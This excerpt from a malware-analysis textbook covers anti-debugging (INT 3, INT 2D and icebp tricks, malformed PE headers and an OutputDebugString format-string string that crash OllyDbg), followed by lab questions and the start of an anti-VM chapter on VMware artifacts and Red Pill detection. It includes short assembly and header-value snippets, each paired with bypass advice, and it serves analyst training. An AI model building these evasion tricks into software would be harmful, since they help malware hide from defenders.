<p class="calibre1">As discussed earlier, interrupts generate exceptions that are used by the debugger to perform operations like breakpoints. In Chapter 15, you learned how to set up an SEH to achieve an unconventional jump. The modification of the SEH chain applies to both anti-disassembly and anti-debugging. In this section, we will skip the SEH specifics (since they were addressed in Chapter 15) and focus on other ways that exceptions can be used to hamper the malware analyst. </p>
<p class="calibre1">Exceptions can be used to disrupt or detect a debugger. Most exception-based detection relies on the fact that debuggers will trap the exception and not immediately pass it to the process being debugged for handling. The default setting on most debuggers is to trap exceptions and not pass them to the program. If the debugger doesn’t pass the exception to the process properly, that failure can be detected within the process exception-handling mechanism. </p>
<p class="calibre1">Anti-Debugging</p>
<p class="calibre1"><b class="calibre3">361</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p395"/><img src="index-395_1.png" alt="Image 86" class="calibre2"/></p>
<p class="calibre1">Figure 16-4 shows OllyDbg’s default settings; all exceptions will be trapped unless the box is checked. These options are accessed via <b class="calibre3">Options</b><b class="calibre3">Debugging</b> <b class="calibre3">Options</b><b class="calibre3">Exceptions</b>. </p>
<p class="calibre1"> <i class="calibre4">Figure 16-4: Ollydbg exception processing options</i></p>
<p class="calibre1"><b class="calibre3">NOTE</b></p>
<p class="calibre1"> <i class="calibre4">When performing malware analysis, we recommend setting the debugging options to</i> <i class="calibre4">pass all of the exceptions to the program. </i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Inserting Interrupts</b></i></p>
<p class="calibre1">A classic form of anti-debugging is to use exceptions to annoy the analyst and disrupt normal program execution by inserting interrupts in the middle of a valid instruction sequence. Depending on the debugger settings, these inser-tions could cause the debugger to stop, since it is the same mechanism the debugger itself uses to set software breakpoints. </p>
<p class="calibre1"><b class="calibre3">Inserting INT 3</b></p>
<p class="calibre1">Because INT 3 is used by debuggers to set software breakpoints, one anti-debugging technique consists of inserting 0xCC opcodes into valid sections of code in order to trick the debugger into thinking that the opcodes are its breakpoints. Some debuggers track where they set software breakpoints in order to avoid falling for this trick. </p>
<p class="calibre1">The 2-byte opcode sequence 0xCD03 can also be used to generate an INT 3, and this is often a valid way for malware to interfere with WinDbg. Outside a debugger, 0xCD03 generates a STATUS_BREAKPOINT exception. However, inside WinDbg, it catches the breakpoint and then silently advances EIP by exactly 1 byte, since a breakpoint is normally the 0xCC opcode. This can cause the program to execute a different set of instructions when being debugged by WinDbg versus running normally. (OllyDbg is not vulnerable to interference using this 2-byte INT 3 attack.)</p>
<p class="calibre1"><b class="calibre3">362</b></p>
<p class="calibre1">Chapter 16</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p396"/>Listing 16-9 shows assembly code that implements this technique. This example sets a new SEH and then calls INT 3 to force the code to continue. </p>
<p class="calibre1">push offset continue</p>
<p class="calibre1">push dword fs:[0] </p>
<p class="calibre1">mov fs:[0], esp </p>
<p class="calibre1">int 3</p>
<p class="calibre1">//being debugged</p>
<p class="calibre1">continue: </p>
<p class="calibre1">//not being debugged </p>
<p class="calibre1"> <i class="calibre4">Listing 16-9: INT 3 technique</i></p>
<p class="calibre1"><b class="calibre3">Inserting INT 2D</b></p>
<p class="calibre1">The INT 2D anti-debugging technique functions like INT 3—the INT 0x2D instruction is used to access the kernel debugger. Because INT 0x2D is the way that kernel debuggers set breakpoints, the method shown in Listing 16-10 applies. </p>
<p class="calibre1"><b class="calibre3">Inserting ICE</b></p>
<p class="calibre1">One of Intel’s undocumented instructions is the In-Circuit Emulator (ICE) breakpoint, icebp (opcode 0xF1). This instruction is designed to make it easier to debug using an ICE, because it is difficult to set an arbitrary breakpoint with an ICE. </p>
<p class="calibre1">Executing this instruction generates a single-step exception. If the program is being traced via single-stepping, the debugger will think it is the normal exception generated by the single-step and not execute a previously set exception handler. Malware can take advantage of this by using the exception handler for its normal execution flow, which would be disrupted in this case. </p>
<p class="calibre1">In order to bypass this technique, do not single-step over an icebp instruction. </p>
<p class="calibre1"><b class="calibre3">Debugger Vulnerabilities</b></p>
<p class="calibre1">Like all software, debuggers contain vulnerabilities, and sometimes malware authors attack them in order to prevent debugging. Here, we present several popular vulnerabilities in the way OllyDbg handles the PE format. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">PE Header Vulnerabilities</b></i></p>
<p class="calibre1">The first technique modifies the Microsoft PE header of a binary executable, causing OllyDbg to crash when loading the executable. The result is an error of “Bad or Unknown 32-bit Executable File,” yet the program usually runs fine outside the debugger. </p>
<p class="calibre1">This issue is due to the fact that OllyDbg follows the Microsoft specifica-tions regarding the PE header too strictly. In the PE header, there is typically a structure known as the IMAGE_OPTIONAL_HEADER. Figure 16-5 shows a subset of this structure. </p>
<p class="calibre1">Anti-Debugging</p>
<p class="calibre1"><b class="calibre3">363</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p397"/>…</p>
<p class="calibre1">…</p>
<p class="calibre1">00000000h</p>
<p class="calibre1">LoaderFlags</p>
<p class="calibre1">NumberOfRvaAndSizes</p>
<p class="calibre1">00000099h</p>
<p class="calibre1">0x99 is invalid! </p>
<p class="calibre1">DataDirectory[0] </p>
<p class="calibre1">Virtual Address</p>
<p class="calibre1">00000000h</p>
<p class="calibre1">Size</p>
<p class="calibre1">00000000h</p>
<p class="calibre1">DataDirectory[1] </p>
<p class="calibre1">Virtual Address</p>
<p class="calibre1">01007604h</p>
<p class="calibre1">01007604h</p>
<p class="calibre1">Size</p>
<p class="calibre1">000000C8h</p>
<p class="calibre1">000000C8h</p>
<p class="calibre1">DataDirectory[2] </p>
<p class="calibre1">Virtual Address</p>
<p class="calibre1">0100B000h</p>
<p class="calibre1">16 items in the </p>
<p class="calibre1">Size</p>
<p class="calibre1">00008958h</p>
<p class="calibre1">00008958h</p>
<p class="calibre1">DataDirectory Array</p>
<p class="calibre1">…</p>
<p class="calibre1">…</p>
<p class="calibre1">DataDirectory[15] </p>
<p class="calibre1">Virtual Address</p>
<p class="calibre1">00000000h</p>
<p class="calibre1">Size</p>
<p class="calibre1">00000000h</p>
<p class="calibre1"> <i class="calibre4">Figure 16-5: PE IMAGE_OPTIONAL_HEADER and NumberOfRvaAndSizes vulnerability</i> The last several elements in this structure are of particular interest. The NumberOfRvaAndSizes field identifies the number of entries in the DataDirectory array that follows. The DataDirectory array indicates where to find other important executable components in the file; it is little more than an array of IMAGE_DATA_DIRECTORY structures at the end of the optional header structure. </p>
<p class="calibre1">Each data directory structure specifies the size and relative virtual address of the directory. </p>
<p class="calibre1">The size of the array is set to IMAGE_NUMBEROF_DIRECTORY_ENTRIES, which is equal to 0x10. The Windows loader ignores any NumberOfRvaAndSizes greater than 0x10, because anything larger will not fit in the DataDirectory array. </p>
<p class="calibre1">OllyDbg follows the standard and uses NumberOfRvaAndSizes no matter what. </p>
<p class="calibre1">As a consequence, setting the size of the array to a value greater than 0x10 </p>
<p class="calibre1">(like 0x99) will cause OllyDbg to generate a pop-up window to the user before exiting the program. </p>
<p class="calibre1">The easiest way to overcome this technique is to manually modify the PE header and set the NumberOfRvaAndSizes to 0x10 using a hex editor or PE </p>
<p class="calibre1">Explorer. Or, of course, you can use a debugger that is not vulnerable to this technique, such as WinDbg or OllyDbg 2.0. </p>
<p class="calibre1">Another PE header trick involves section headers, causing OllyDbg to crash during loading with the error “File contains too much data.” (WinDbg and OllyDbg 2.0 are not vulnerable to this technique.) Sections contain the content of the file, including code, data, resources, and other information. </p>
<p class="calibre1">Each section has a header in the form of an IMAGE_SECTION_HEADER structure. </p>
<p class="calibre1">Figure 16-6 shows a subset of this structure. </p>
<p class="calibre1"><b class="calibre3">364</b></p>
<p class="calibre1">Chapter 16</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p398"/><b class="calibre3">Name</b></p>
<p class="calibre1"><b class="calibre3">“.text” </b></p>
<p class="calibre1">VirtualSize</p>
<p class="calibre1">00004C52h</p>
<p class="calibre1">Location to virtually </p>
<p class="calibre1">VirtualAddress</p>
<p class="calibre1">00401000h</p>
<p class="calibre1">load this section</p>
<p class="calibre1">SizeOfRawData</p>
<p class="calibre1">77777777h</p>
<p class="calibre1">77777777h is </p>
<p class="calibre1">Location of raw data </p>
<p class="calibre1">invalid! </p>
<p class="calibre1">PointerToRawData</p>
<p class="calibre1">00000400h</p>
<p class="calibre1">in PE file </p>
<p class="calibre1">PointerToRelocations</p>
<p class="calibre1">00000000h</p>
<p class="calibre1">…</p>
<p class="calibre1"> <i class="calibre4">Figure 16-6: PE IMAGE_SECTION_HEADER structure</i></p>
<p class="calibre1">The elements of interest are VirtualSize and the SizeOfRawData. According to the Windows PE specification, VirtualSize should contain the total size of the section when loaded into memory, and SizeOfRawData should contain the size of data on disk. The Windows loader uses the smaller of VirtualSize and SizeOfRawData to map the section data into memory. If the SizeOfRawData is larger than VirtualSize, only VirtualSize data is copied into memory; the rest is ignored. Because OllyDbg uses only the SizeOfRawData, setting the SizeofRawData to something large like 0x77777777, will cause OllyDbg to crash. </p>
<p class="calibre1">The easiest way to overcome this anti-debugging technique is to manually modify the PE header and set the SizeOfRawData using a hex editor to change the value to be close to VirtualSize. (Note that, according to the specification, this value must be a multiple of the FileAlignment value from the IMAGE_OPTIONAL_HEADER). PE Explorer is a great program to use for this purpose because it is not fooled by a large value for SizeofRawData. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">The OutputDebugString Vulnerability</b></i></p>
<p class="calibre1">Malware often attempts to exploit a format string vulnerability in version 1.1 </p>
<p class="calibre1">of OllyDbg, by providing a string of %s as a parameter to OutputDebugString to cause OllyDbg to crash. Beware of suspicious calls like OutputDebugString ("%s%s%s%s%s%s%s%s%s%s%s%s%s%s"). If this call executes, your debugger will crash. </p>
<p class="calibre1"><b class="calibre3">Conclusion</b></p>
<p class="calibre1">This chapter introduced you to some popular anti-debugging techniques. </p>
<p class="calibre1">It takes patience and perseverance to learn to recognize and bypass anti-debugging techniques. Be sure to take notes during your analysis and remember the location of any anti-debugging techniques and how you bypass them; doing so will help you if you need to restart the debugging process. </p>
<p class="calibre1">Most anti-debugging techniques can be spotted using common sense, while debugging a process slowly. For example, if you see code terminating prematurely at a conditional jump, that might hint at an anti-debugging Anti-Debugging</p>
<p class="calibre1"><b class="calibre3">365</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p399"/>technique. Most popular anti-debugging techniques involve accessing fs:[30h], calling a Windows API call, or performing a timing check. </p>
<p class="calibre1">Of course, as with all malware analysis, the best way to learn to thwart anti-debugging techniques is by continuing to reverse and study malware. </p>
<p class="calibre1">Malware authors are always looking for new ways to thwart debuggers and to keep malware analysts like you on your toes. </p>
<p class="calibre1"><b class="calibre3">366</b></p>
<p class="calibre1">Chapter 16</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p400"/><b class="calibre3">L A B S</b></p>
<p class="calibre1"><b class="calibre3">Lab 16-1</b></p>
<p class="calibre1">Analyze the malware found in  <i class="calibre4">Lab16-01.exe</i> using a debugger. This is the same malware as  <i class="calibre4">Lab09-01.exe</i>, with added anti-debugging techniques. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Questions</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">Which anti-debugging techniques does this malware employ? </p>
<p class="calibre1">2. </p>
<p class="calibre1">What happens when each anti-debugging technique succeeds? </p>
<p class="calibre1">3. </p>
<p class="calibre1">How can you get around these anti-debugging techniques? </p>
<p class="calibre1">4. </p>
<p class="calibre1">How do you manually change the structures checked during runtime? </p>
<p class="calibre1">5. </p>
<p class="calibre1">Which OllyDbg plug-in will protect you from the anti-debugging techniques used by this malware? </p>
<p class="calibre1"><b class="calibre3">Lab 16-2</b></p>
<p class="calibre1">Analyze the malware found in  <i class="calibre4">Lab16-02.exe</i> using a debugger. The goal of this lab is to figure out the correct password. The malware does not drop a malicious payload. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Questions</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">What happens when you run  <i class="calibre4">Lab16-02.exe</i> from the command line? </p>
<p class="calibre1">2. </p>
<p class="calibre1">What happens when you run  <i class="calibre4">Lab16-02.exe</i> and guess the command-line parameter? </p>
<p class="calibre1">3. </p>
<p class="calibre1">What is the command-line password? </p>
<p class="calibre1">4. </p>
<p class="calibre1">Load  <i class="calibre4">Lab16-02.exe</i> into IDA Pro. Where in the main function is strncmp found? </p>
<p class="calibre1">5. </p>
<p class="calibre1">What happens when you load this malware into OllyDbg using the default settings? </p>
<p class="calibre1">6. </p>
<p class="calibre1">What is unique about the PE structure of  <i class="calibre4">Lab16-02.exe</i>? </p>
<p class="calibre1">7. </p>
<p class="calibre1">Where is the callback located? (Hint: Use CTRL-E in IDA Pro.) 8. </p>
<p class="calibre1">Which anti-debugging technique is the program using to terminate immediately in the debugger and how can you avoid this check? </p>
<p class="calibre1">9. </p>
<p class="calibre1">What is the command-line password you see in the debugger after you disable the anti-debugging technique? </p>
<p class="calibre1">10. Does the password found in the debugger work on the command line? </p>
<p class="calibre1">11. Which anti-debugging techniques account for the different passwords in the debugger and on the command line, and how can you protect against them? </p>
<p class="calibre1">Anti-Debugging</p>
<p class="calibre1"><b class="calibre3">367</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p401"/><b class="calibre3">Lab 16-3</b></p>
<p class="calibre1">Analyze the malware in  <i class="calibre4">Lab16-03.exe</i> using a debugger. This malware is similar to  <i class="calibre4">Lab09-02.exe</i>, with certain modifications, including the introduction of anti-debugging techniques. If you get stuck, see Lab 9-2. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Questions</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">Which strings do you see when using static analysis on the binary? </p>
<p class="calibre1">2. </p>
<p class="calibre1">What happens when you run this binary? </p>
<p class="calibre1">3. </p>
<p class="calibre1">How must you rename the sample in order for it to run properly? </p>
<p class="calibre1">4. </p>
<p class="calibre1">Which anti-debugging techniques does this malware employ? </p>
<p class="calibre1">5. </p>
<p class="calibre1">For each technique, what does the malware do if it determines it is running in a debugger? </p>
<p class="calibre1">6. </p>
<p class="calibre1">Why are the anti-debugging techniques successful in this malware? </p>
<p class="calibre1">7. </p>
<p class="calibre1">What domain name does this malware use? </p>
<p class="calibre1"><b class="calibre3">368</b></p>
<p class="calibre1">Chapter 16</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p402"/><b class="calibre3">A N T I - V I R T U A L   M A C H I N E  </b></p>
<p class="calibre1"><b class="calibre3">T E C H N I Q U E S</b></p>
<p class="calibre1">Malware authors sometimes use anti-virtual machine </p>
<p class="calibre1">(anti-VM) techniques to thwart attempts at analysis. </p>
<p class="calibre1">With these techniques, the malware attempts to detect </p>
<p class="calibre1">whether it is being run inside a virtual machine. If a </p>
<p class="calibre1">virtual machine is detected, it can act differently or </p>
<p class="calibre1">simply not run. This can, of course, cause problems </p>
<p class="calibre1">for the analyst. </p>
<p class="calibre1">Anti-VM techniques are most commonly found in malware that is widely deployed, such as bots, scareware, and spyware (mostly because honeypots often use virtual machines and because this malware typically targets the average user’s machine, which is unlikely to be running a virtual machine). </p>
<p class="calibre1">The popularity of anti-VM malware has been going down recently, and this can be attributed to the great increase in the usage of virtualization. </p>
<p class="calibre1">Traditionally, malware authors have used anti-VM techniques because they thought only analysts would be running the malware in a virtual machine. </p>
<p class="calibre1">However, today both administrators and users use virtual machines in order to make it easy to rebuild a machine (rebuilding had been a tedious process, but virtual machines save time by allowing you to go back to a snapshot). </p>
<p class="calibre1">Malware authors are starting to realize that just because a machine is a virtual </p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p403"/><img src="index-403_1.png" alt="Image 87" class="calibre2"/></p>
<p class="calibre1">machine does not necessarily mean that it isn’t a valuable victim. As virtualization continues to grow, anti-VM techniques will probably become even less common. </p>
<p class="calibre1">Because anti-VM techniques typically target VMware, in this chapter, we’ll focus on anti-VMware techniques. We’ll examine the most common techniques and how to defeat them by tweaking a couple of settings, removing software, or patching an executable. </p>
<p class="calibre1"><b class="calibre3">VMware Artifacts</b></p>
<p class="calibre1">The VMware environment leaves many artifacts on the system, especially when VMware Tools is installed. Malware can use these artifacts, which are present in the filesystem, registry, and process listing, to detect VMware. </p>
<p class="calibre1">For example, Figure 17-1 shows the process listing for a standard VMware image with VMware Tools installed. Notice that three VMware processes are running:  <i class="calibre4">VMwareService.exe</i>,  <i class="calibre4">VMwareTray.exe</i>, and  <i class="calibre4">VMwareUser.exe</i>. Any one of these can be found by malware as it searches the process listing for the VMware string. </p>
<p class="calibre1"> <i class="calibre4">Figure 17-1: Process listing on a VMware image with </i></p>
<p class="calibre1"> <i class="calibre4">VMware Tools running</i></p>
<p class="calibre1"> <i class="calibre4">VMwareService.exe</i> runs the VMware Tools Service as a child of  <i class="calibre4">services.exe</i>. </p>
<p class="calibre1">It can be identified by searching the registry for services installed on a machine or by listing services using the following command:</p>
<p class="calibre1">C:\&gt; <b class="calibre3">net start | findstr VMware</b></p>
<p class="calibre1">VMware Physical Disk Helper Service</p>
<p class="calibre1">VMware Tools Service</p>
<p class="calibre1"><b class="calibre3">370</b></p>
<p class="calibre1">Chapter 17</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p404"/>The VMware installation directory  <i class="calibre4">C:\Program Files\VMware\VMware Tools</i> may also contain artifacts, as can the registry. A quick search for “VMware” </p>
<p class="calibre1">in a virtual machine’s registry might find keys like the following, which are entries that include information about the virtual hard drive, adapters, and virtual mouse. </p>
<p class="calibre1">[HKEY_LOCAL_MACHINE\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0]</p>
<p class="calibre1">"Identifier"="VMware Virtual IDE Hard Drive" </p>
<p class="calibre1">"Type"="DiskPeripheral" </p>
<p class="calibre1">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Reinstall\0000]</p>
<p class="calibre1">"DeviceDesc"="VMware Accelerated AMD PCNet Adapter" </p>
<p class="calibre1">"DisplayName"="VMware Accelerated AMD PCNet Adapter" </p>
<p class="calibre1">"Mfg"="VMware, Inc." </p>
<p class="calibre1">"ProviderName"="VMware, Inc." </p>
<p class="calibre1">[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E96F-E325-11CE-BFC1-08002BE10318}\0000]</p>
<p class="calibre1">"LocationInformationOverride"="plugged into PS/2 mouse port" </p>
<p class="calibre1">"InfPath"="oem13.inf" </p>
<p class="calibre1">"InfSection"="VMMouse" </p>
<p class="calibre1">"ProviderName"="VMware, Inc." </p>
<p class="calibre1">As discussed in Chapter 2, you can connect your virtual machine to a network in a variety of ways, all of which allow the virtual machine to have its own virtual network interface card (NIC). Because VMware must virtualize the NIC, it needs to create a MAC address for the virtual machine, and, depending on its configuration, the network adapter can also identify VMware usage. </p>
<p class="calibre1">The first three bytes of a MAC address are typically specific to the vendor, and MAC addresses starting with 00:0C:29 are associated with VMware. </p>
<p class="calibre1">VMware MAC addresses typically change from version to version, but all that a malware author needs to do is to check the virtual machine’s MAC address for VMware values. </p>
<p class="calibre1">Malware can also detect VMware by other hardware, such as the mother-board. If you see malware checking versions of hardware, it might be trying to detect VMware. Look for the code that checks MAC addresses or hardware versions, and patch the code to avoid the check. </p>
<p class="calibre1">The most common VMware artifacts can be easily eliminated by uninstalling VMware Tools or by trying to stop the VMware Tools Service with the following command:</p>
<p class="calibre1"><b class="calibre3">net stop "VMware Tools Service" </b></p>
<p class="calibre1">You may also be able to prevent malware from searching for artifacts. </p>
<p class="calibre1">For example, if you find a single VMware-related string in malware—such as net start | findstr VMware, VMMouse, VMwareTray.exe, or VMware Virtual IDE Hard Drive—you know that the malware is attempting to detect VMware artifacts. </p>
<p class="calibre1">You should be able to find this code easily in IDA Pro using the references to the strings. Once you find it, patch it to avoid detection while ensuring that the malware will function properly. </p>
<p class="calibre1">Anti-Virtual Machine Techniques</p>
<p class="calibre1"><b class="calibre3">371</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p405"/> <i class="calibre4"><b class="calibre3">Bypassing VMware Artifact Searching</b></i></p>
<p class="calibre1">Defeating malware that searches for VMware artifacts is often a simple two-step process: identify the check and then patch it. For example, say we run strings against the malware  <i class="calibre4">vmt.exe</i>. We notice that the binary contains the string "VMwareTray.exe", and we discover a cross-reference from the code to this string. We follow this cross-reference to 0x401098, as shown in the disassembly in Listing 17-1 at . </p>
<p class="calibre1">0040102D        call ds:<b class="calibre3">CreateToolhelp32Snapshot</b></p>
<p class="calibre1">00401033        lea ecx, [ebp+processentry32]</p>
<p class="calibre1">00401039        mov ebx, eax</p>
<p class="calibre1">0040103B        push ecx        ; lppe</p>
<p class="calibre1">0040103C        push ebx        ; hSnapshot</p>
<p class="calibre1">0040103D        mov [ebp+processentry32.dwSize], 22Ch</p>
<p class="calibre1">00401047        call ds:Process32FirstW</p>
<p class="calibre1">0040104D        mov esi, ds:WideCharToMultiByte</p>
<p class="calibre1">00401053        mov edi, ds:strncmp</p>
<p class="calibre1">00401059        lea esp, [esp+0]</p>
<p class="calibre1">00401060 loc_401060:         ; CODE XREF: sub_401000+B7j 00401060        push 0          ; lpUsedDefaultChar</p>
<p class="calibre1">00401062        push 0          ; lpDefaultChar</p>
<p class="calibre1">00401064        push 104h       ; cbMultiByte</p>
<p class="calibre1">00401069        lea edx, [ebp+Str1]</p>
<p class="calibre1">0040106F        push edx        ; lpMultiByteStr</p>
<p class="calibre1">00401070        push 0FFFFFFFFh ; cchWideChar</p>
<p class="calibre1">00401072        lea eax, [ebp+processentry32.szExeFile]</p>
<p class="calibre1">00401078        push eax        ; lpWideCharStr</p>
<p class="calibre1">00401079        push 0          ; dwFlags</p>
<p class="calibre1">0040107B        push 3          ; CodePage</p>
<p class="calibre1">0040107D        call esi ; WideCharToMultiByte</p>
<p class="calibre1">0040107F        lea eax, [ebp+Str1]</p>
<p class="calibre1">00401085        lea edx, [eax+1]</p>
<p class="calibre1">00401088 loc_401088:         ; CODE XREF: sub_401000+8Dj 00401088        mov cl, [eax]</p>
<p class="calibre1">0040108A        inc eax</p>
<p class="calibre1">0040108B        test cl, cl</p>
<p class="calibre1">0040108D        jnz short loc_401088</p>
<p class="calibre1">0040108F        sub eax, edx</p>
<p class="calibre1">00401091        push eax        ; MaxCount</p>
<p class="calibre1">00401092        lea ecx, [ebp+Str1]</p>
<p class="calibre1">00401098        push offset Str2 ; " <b class="calibre3">VMwareTray.exe</b>" </p>
<p class="calibre1">0040109D        push ecx        ; Str1</p>
<p class="calibre1">0040109E        call edi ; <b class="calibre3">strncmp</b> </p>
<p class="calibre1">004010A0        add esp, 0Ch</p>
<p class="calibre1">004010A3        test eax, eax</p>
<p class="calibre1">004010A5        jz  short loc_4010C0</p>
<p class="calibre1">004010A7        lea edx, [ebp+processentry32]</p>
<p class="calibre1">004010AD        push edx        ; lppe</p>
<p class="calibre1">004010AE        push ebx        ; hSnapshot</p>
<p class="calibre1">004010AF        call ds:<b class="calibre3">Process32NextW</b></p>
<p class="calibre1">004010B5        test eax, eax</p>
<p class="calibre1">004010B7        jnz short loc_401060</p>
<p class="calibre1">... </p>
<p class="calibre1"><b class="calibre3">372</b></p>
<p class="calibre1">Chapter 17</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p406"/>004010C0 loc_4010C0:         ; CODE XREF: sub_401000+A5j 004010C0        push 0          ; Code</p>
<p class="calibre1">004010C2        call ds:exit</p>
<p class="calibre1"> <i class="calibre4">Listing 17-1: Disassembly snippet from </i> vmt.exe <i class="calibre4"> showing VMware artifact detection</i> Analyzing this code further, we notice that it is scanning the process listing with functions like CreateToolhelp32Snapshot, Process32Next, and so on. The strncmp at  is comparing the VMwareTray.exe string with the result of converting processentry32.szExeFile to ASCII to determine if the process name is in the process listing. If VMwareTray.exe is discovered in the process listing, the program will immediately terminate, as seen at 0x4010c2. </p>
<p class="calibre1">There are a couple of ways to avoid this detection:</p>
<p class="calibre1"></p>
<p class="calibre1">Patch the binary while debugging so that the jump at 0x4010a5 will never be taken. </p>
<p class="calibre1"></p>
<p class="calibre1">Use a hex editor to modify the VMwareTray.exe string to read XXXareTray.exe to make the comparison fail since this is not a valid process string. </p>
<p class="calibre1"></p>
<p class="calibre1">Uninstall VMware Tools so that  <i class="calibre4">VMwareTray.exe</i> will no longer run. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Checking for Memory Artifacts</b></i></p>
<p class="calibre1">VMware leaves many artifacts in memory as a result of the virtualization process. Some are critical processor structures, which, because they are either moved or changed on a virtual machine, leave recognizable footprints. </p>
<p class="calibre1">One technique commonly used to detect memory artifacts is a search through physical memory for the string VMware, which we have found may detect several hundred instances. </p>
<p class="calibre1"><b class="calibre3">Vulnerable Instructions</b></p>
<p class="calibre1">The virtual machine monitor program monitors the virtual machine’s execution. It runs on the host operating system to present the guest operating system with a virtual platform. It also has a couple of security weaknesses that can allow malware to detect virtualization. </p>
<p class="calibre1"><b class="calibre3">NOTE</b></p>
<p class="calibre1"> <i class="calibre4">The x86 instruction-related issues in virtual machines discussed in this section were</i> <i class="calibre4">originally outlined in the USENIX 2000 paper “Analysis of the Intel Pentium’s Ability</i> <i class="calibre4">to Support a Secure Virtual Machine Monitor” by John Robin and Cynthia Irvine. </i></p>
<p class="calibre1">In kernel mode, VMware uses binary translation for emulation. Certain privileged instructions in kernel mode are interpreted and emulated, so they don’t run on the physical processor. Conversely, in user mode, the code runs directly on the processor, and nearly every instruction that interacts with hardware is either privileged or generates a kernel trap or interrupt. VMware catches all the interrupts and processes them, so that the virtual machine still thinks it is a regular machine. </p>
<p class="calibre1">Anti-Virtual Machine Techniques</p>
<p class="calibre1"><b class="calibre3">373</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p407"/>Some instructions in x86 access hardware-based information but don’t generate interrupts. These include sidt, sgdt, sldt, and cpuid, among others. </p>
<p class="calibre1">In order to virtualize these instructions properly, VMware would need to perform binary translation on every instruction (not just kernel-mode instructions), resulting in a huge performance hit. To avoid huge performance hits from doing full-instruction emulation, VMware allows certain instructions to execute without being properly virtualized. Ultimately, this means that certain instruction sequences will return different results when running under VMware than they will on native hardware. </p>
<p class="calibre1">The processor uses certain key structures and tables, which are loaded at different offsets as a side effect of this lack of full translation. The  <i class="calibre4">interrupt</i> <i class="calibre4">descriptor table</i>  <i class="calibre4">(IDT)</i> is a data structure internal to the CPU, which is used by the operating system to determine the correct response to interrupts and exceptions. Under x86, all memory accesses pass through either the  <i class="calibre4">global</i> <i class="calibre4">descriptor table (GDT)</i> or the  <i class="calibre4">local descriptor table (LDT)</i>. These tables contain segment descriptors that provide access details for each segment, including the base address, type, length, access rights, and so on. IDT (IDTR), GDT </p>
<p class="calibre1">(GDTR), and LDT (LDTR) are the internal registers that contain the address and size of these respective tables. </p>
<p class="calibre1">Note that operating systems do not need to utilize these tables. For example, Windows implements a flat memory model and uses only the GDT </p>
<p class="calibre1">by default. It does not use the LDT. </p>
<p class="calibre1">Three sensitive instructions—sidt, sgdt, and sldt—read the location of these tables, and all store the respective register into a memory location. </p>
<p class="calibre1">While these instructions are typically used by the operating system, they are not privileged in the x86 architecture, and they can be executed from user space. </p>
<p class="calibre1">An x86 processor has only three registers to store the locations of these three tables. Therefore, these registers must contain values valid for the underlying host operating system and will diverge from values expected by the virtualized (guest) operating system. Since the sidt, sgdt, and sldt instructions can be invoked at any time by user-mode code without being trapped and properly virtualized by VMware, they can be used to detect its presence. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Using the Red Pill Anti-VM Technique</b></i></p>
<p class="calibre1">Red Pill is an anti-VM technique that executes the sidt instruction to grab the value of the IDTR register. The virtual machine monitor must relocate the guest’s IDTR to avoid conflict with the host’s IDTR. Since the virtual machine monitor is not notified when the virtual machine runs the sidt instruction, the IDTR for the virtual machine is returned. The Red Pill tests for this discrepancy to detect the usage of VMware. </p>
<p class="calibre1">Listing 17-2 shows how Red Pill might be used by malware. </p>
<p class="calibre1">push    ebp</p>
<p class="calibre1">mov     ebp, esp</p>
<p class="calibre1">sub     esp, 454h</p>
<p class="calibre1">push    ebx</p>
<p class="calibre1">push    esi</p>
<p class="calibre1"><b class="calibre3">374</b></p>
<p class="calibre1">Chapter 17</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p408"/>push    edi</p>
<p class="calibre1">push    8               ; Size</p>
<p class="calibre1">push    0               ; Val</p>
<p class="calibre1">lea     eax, [ebp+Dst]</p>
<p class="calibre1">push    eax             ; Dst</p>
<p class="calibre1">call    _memset</p>
<p class="calibre1">add     esp, 0Ch</p>
<p class="calibre1">lea     eax, [ebp+Dst]</p>
<p class="calibre1"> <b class="calibre3">sidt</b>    fword ptr [eax]</p>
<p class="calibre1">mov     al, [eax+5]</p>
<p class="calibre1">cmp     al, 0FFh</p>
<p class="calibre1">jnz     short loc_401E19  </p>
<p class="calibre1"> <i class="calibre4">Listing 17-2: Red Pill in malware</i></p>
